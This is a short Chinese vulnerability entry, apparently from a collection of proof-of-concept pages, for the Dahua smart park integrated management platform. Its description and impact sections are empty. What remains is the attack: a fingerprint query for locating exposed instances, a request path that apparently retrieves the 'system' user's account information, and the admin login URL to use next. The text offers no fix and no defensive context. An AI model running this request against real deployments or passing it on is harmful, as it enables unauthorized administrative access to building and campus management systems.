漏洞描述¶

漏洞影响¶

智慧园区综合管理平台

网络测绘¶

app="dahua-智慧园区综合管理平台"

漏洞复现¶

请求POC

/admin/user_getUserInfoByUserName.action?userName=system

获取后访问地址

/admin/login_login.action
